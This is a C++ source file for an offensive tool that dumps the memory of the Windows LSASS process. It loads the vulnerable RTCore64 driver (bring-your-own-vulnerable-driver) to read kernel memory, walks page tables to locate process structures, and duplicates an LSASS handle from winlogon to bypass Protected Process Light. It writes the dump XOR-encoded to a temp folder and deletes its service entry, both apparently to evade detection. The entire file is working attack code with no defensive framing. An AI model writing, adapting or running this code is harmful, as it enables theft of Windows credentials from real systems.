
// Unified LSASS Dumper with BYOVD + PPL Bypass
#define UNICODE
#define _UNICODE

#include "headers/driver_interface.h"
#include "headers/paging.h"
#include "headers/eprocess_offsets.h"
#include "headers/handle_offsets.h"

#include <windows.h>
#include <psapi.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <stdint.h>

#define DRIVER_PATH L"C:\\Windows\\Temp\\RTCore64.sys"
#define DRIVER_NAME L"MyRTCore64"
#define OUTPUT_FILE L"C:\\Windows\\Temp\\lsass_encoded.dmp"
#define LOG_FILE    L"C:\\Windows\\Temp\\lsass_dumper.log"
#define XOR_KEY     0x41

// Logging
void WriteLog(const std::string& msg) {
    std::ofstream log(LOG_FILE, std::ios::app);
    log << msg << std::endl;
    log.close();
}

// Open handle to driver
HANDLE OpenDriver() {
    return CreateFileW(RTCORE64_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
}

// Driver loading
bool LoadDriver(const std::wstring& driverName, const std::wstring& driverPath) {
    SC_HANDLE scManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) {
        WriteLog("[-] Failed to open Service Control Manager.");
        return false;
    }

    // Try opening existing service
    SC_HANDLE service = OpenService(scManager, driverName.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
    if (!service) {
        // Create new service
        service = CreateService(scManager, driverName.c_str(), driverName.c_str(),
            SERVICE_START | DELETE | SERVICE_STOP,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            driverPath.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr);

        if (!service) {
            DWORD err = GetLastError();
            WriteLog("[-] CreateService failed. Error: " + std::to_string(err));
            CloseServiceHandle(scManager);
            return false;
        }

        WriteLog("[+] Driver service created.");
    } else {
        WriteLog("[*] Driver service already exists.");
    }

    // Try to start the driver (may already be running)
    if (!StartService(service, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            WriteLog("[*] Driver already running.");
        } else {
            WriteLog("[-] Failed to start driver. Error: " + std::to_string(err));
            CloseServiceHandle(service);
            CloseServiceHandle(scManager);
            return false;
        }
    } else {
        WriteLog("[+] Driver started successfully.");
    }

    // Optionally delete service entry
    DeleteService(service);
    CloseServiceHandle(service);
    CloseServiceHandle(scManager);
    return true;
}

// Memory access
bool ReadPhys(HANDLE h, uint64_t pa, void* out, size_t sz) {
    std::vector<BYTE> tmp(sz);
    PHYSICAL_MEMORY_RW req;
    req.address = pa;
    req.size = DWORD(sz);
    req.buffer = (ULONGLONG)(tmp.data());
    DWORD ret = 0;
    if (!DeviceIoControl(h, IOCTL_READ_PHYSICAL_MEMORY, &req, sizeof(req), &req, sizeof(req), &ret, nullptr))
        return false;
    memcpy(out, tmp.data(), sz);
    return true;
}

bool TranslateVAtoPA(HANDLE h, uint64_t cr3, uint64_t va, uint64_t& outPA) {
    uint64_t entry = 0;
    uint64_t pml4Index = VADDR_TO_INDEX(va, 39);
    uint64_t pdptIndex = VADDR_TO_INDEX(va, 30);
    uint64_t pdIndex   = VADDR_TO_INDEX(va, 21);
    uint64_t ptIndex   = VADDR_TO_INDEX(va, 12);

    uint64_t pml4e = cr3 + (pml4Index * 8);
    if (!ReadPhys(h, pml4e, &entry, 8)) return false;
    if (!(entry & PAGE_PRESENT)) return false;

    uint64_t pdpte = (entry & ~0xFFFULL) + (pdptIndex * 8);
    if (!ReadPhys(h, pdpte, &entry, 8)) return false;
    if (!(entry & PAGE_PRESENT)) return false;
    if (entry & LARGE_PAGE) {
        outPA = (entry & ~((1ULL << 30) - 1)) + (va & ((1ULL << 30) - 1));
        return true;
    }

    uint64_t pde = (entry & ~0xFFFULL) + (pdIndex * 8);
    if (!ReadPhys(h, pde, &entry, 8)) return false;
    if (!(entry & PAGE_PRESENT)) return false;
    if (entry & LARGE_PAGE) {
        outPA = (entry & ~((1ULL << 21) - 1)) + (va & ((1ULL << 21) - 1));
        return true;
    }

    uint64_t pte = (entry & ~0xFFFULL) + (ptIndex * 8);
    if (!ReadPhys(h, pte, &entry, 8)) return false;
    if (!(entry & PAGE_PRESENT)) return false;

    outPA = (entry & ~0xFFFULL) + (va & 0xFFF);
    return true;
}

bool ReadVA(HANDLE h, uint64_t cr3, uint64_t va, void* out, size_t sz) {
    uint64_t pa = 0;
    if (!TranslateVAtoPA(h, cr3, va, pa)) return false;
    return ReadPhys(h, pa, out, sz);
}

// Find EPROCESS of target
bool FindEP(HANDLE h, uint64_t cr3, uint64_t listVA, const std::string& name, uint64_t& foundEP) {
    uint64_t cur = 0;
    if (!ReadVA(h, cr3, listVA, &cur, 8)) return false;
    cur -= OFFSET_ActiveProcessLinks;
    uint64_t first = cur;

    do {
        char img[16] = { 0 };
        if (!ReadVA(h, cr3, cur + OFFSET_ImageFileName, img, sizeof(img))) break;
        if (_stricmp(img, name.c_str()) == 0) {
            foundEP = cur;
            return true;
        }

        uint64_t flink = 0;
        if (!ReadVA(h, cr3, cur + OFFSET_ActiveProcessLinks, &flink, 8)) break;
        cur = flink - OFFSET_ActiveProcessLinks;
    } while (cur != first);

    return false;
}

bool StealHandle(HANDLE h, uint64_t cr3, uint64_t systemEP, uint64_t lsassEP, HANDLE& stolenHandle) {
    uint64_t objTbl = 0, tableCode = 0;
    if (!ReadVA(h, cr3, systemEP + OFFSET_ObjectTable, &objTbl, 8)) return false;
    if (!ReadVA(h, cr3, objTbl + OFFSET_HandleTable_TableCode, &tableCode, 8)) return false;

    uint64_t tableBase = tableCode & ~0xF;
    for (int i = 0; i < 0x1000; ++i) {
        uint64_t entryAddr = tableBase + (i * HANDLE_TABLE_ENTRY_SIZE);
        uint64_t entry = 0;
        if (!ReadVA(h, cr3, entryAddr, &entry, 8)) continue;
        if ((entry & ~0xF) == lsassEP) {
            stolenHandle = (HANDLE)(i * 4);
            return true;
        }
    }
    return false;
}

bool DumpLSASS(HANDLE stolen) {
    std::ofstream out(OUTPUT_FILE, std::ios::binary);
    if (!out.is_open()) return false;

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    uint8_t* addr = nullptr;
    while (VirtualQueryEx(stolen, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && mbi.Protect & (PAGE_READWRITE | PAGE_READONLY | PAGE_EXECUTE_READ)) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(stolen, mbi.BaseAddress, buf.data(), buf.size(), &bytesRead)) {
                for (SIZE_T i = 0; i < bytesRead; ++i) buf[i] ^= XOR_KEY;
                out.write((char*)buf.data(), bytesRead);
            }
        }
        addr += mbi.RegionSize;
    }

    out.close();
    return true;
}

int main() {
    WriteLog("[*] Starting unified LSASS dumper...");

    if (!LoadDriver(DRIVER_NAME, DRIVER_PATH)) {
        WriteLog("[-] Driver load failed.");
        return 1;
    }

    HANDLE h = OpenDriver();
    if (!h || h == INVALID_HANDLE_VALUE) {
        WriteLog("[-] Failed to open RTCore64 device.");
        return 1;
    }

    uint64_t PsInitialSystemProcessVA = 0x8755E0; // Set manually or leak
    uint64_t sysEP = 0;
    if (!ReadVA(h, 0, PsInitialSystemProcessVA, &sysEP, 8)) {
        WriteLog("[-] Could not read PsInitialSystemProcess.");
        return 1;
    }

    uint64_t cr3 = 0;
    if (!ReadVA(h, 0, sysEP + OFFSET_DirectoryTableBase, &cr3, 8)) {
        WriteLog("[-] Could not read kernel CR3.");
        return 1;
    }

    uint64_t lsassEP = 0;
    uint64_t winlogonEP = 0;
    if (!FindEP(h, cr3, sysEP + OFFSET_ActiveProcessLinks, "lsass.exe", lsassEP)) {
        WriteLog("[-] LSASS not found.");
        return 1;
    }
    if (!FindEP(h, cr3, sysEP + OFFSET_ActiveProcessLinks, "winlogon.exe", winlogonEP)) {
        WriteLog("[-] SYSTEM process not found.");
        return 1;
    }

    DWORD winlogonPid = 0;
    if (!ReadVA(h, cr3, winlogonEP + OFFSET_UniqueProcessId, &winlogonPid, sizeof(DWORD))) {
        WriteLog("[-] Failed to read winlogon PID.");
        return 1;
    }

    HANDLE winlogon = OpenProcess(PROCESS_DUP_HANDLE, FALSE, winlogonPid);
    if (!winlogon) {
        WriteLog("[-] Failed to open SYSTEM process.");
        return 1;
    }

    HANDLE targetLSASS = INVALID_HANDLE_VALUE;
    HANDLE stolen = INVALID_HANDLE_VALUE;

    if (!StealHandle(h, cr3, winlogonEP, lsassEP, targetLSASS)) {
        WriteLog("[-] Could not locate LSASS handle.");
        return 1;
    }

    if (!DuplicateHandle(winlogon, targetLSASS, GetCurrentProcess(), &stolen, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 0)) {
        WriteLog("[-] Handle duplication failed.");
        return 1;
    }

    if (!DumpLSASS(stolen)) {
        WriteLog("[-] LSASS dump failed.");
        return 1;
    }

    WriteLog("[+] Dump complete. Encoded output written.");
    return 0;
}
